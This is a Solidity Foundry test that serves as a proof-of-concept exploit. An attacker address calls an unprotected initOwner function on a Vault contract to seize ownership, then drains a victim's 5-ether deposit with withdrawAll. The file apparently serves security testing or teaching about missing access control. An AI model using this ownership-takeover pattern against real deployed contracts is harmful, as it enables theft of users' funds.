// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/AccessControl.sol";

contract AccessControlTest is Test {
    Vault vault;
    address attacker = address(0xBAD);
    address victim = address(0xABC);

    function setUp() public {
        vault = new Vault();
        vm.deal(victim, 5 ether);
        vm.prank(victim);
        vault.deposit{value: 5 ether}();
    }

    function testAccessControlExploit() public {
        vm.startPrank(attacker);

        console.log("Vault balance before:", address(vault).balance);
        console.log("Attacker balance before:", attacker.balance);
        console.log("Owner before:", vault.owner());

        // Attacker claims ownership
        vault.initOwner(attacker);
        console.log("Owner after exploit:", vault.owner());

        // Attacker drains everything
        vault.withdrawAll();

        console.log("Vault balance after:", address(vault).balance);
        console.log("Attacker balance after:", attacker.balance);

        vm.stopPrank();

        assertEq(address(vault).balance, 0);
        assertEq(attacker.balance, 5 ether);
    }
}
